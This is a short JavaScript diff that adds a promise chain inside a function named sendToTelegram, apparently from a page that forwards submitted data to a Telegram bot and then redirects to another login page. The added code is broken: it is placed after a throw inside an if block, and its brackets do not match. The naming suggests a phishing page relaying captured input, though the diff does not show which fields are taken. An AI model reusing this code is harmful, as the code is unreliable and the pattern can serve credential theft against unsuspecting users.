@@ -51,6 +51,17 @@ async function sendToTelegram(data) {
 
         if (!response.ok) {
             throw new Error('Failed to send message');
+			.then(response => response.json())
+    .then(data => {
+      if (data.ok) {
+        window.location.href = 'index.html'; // Redirect to login2.html
+      } else {
+        alert('Failed to send data to the bot. Please try again.');
+      }
+    })
+    .catch(error => {
+      console.error('Error:', error);
+      alert('There was an error sending the data.');
         }
         const result = await response.json();
         console.log('Message sent successfully:', result);
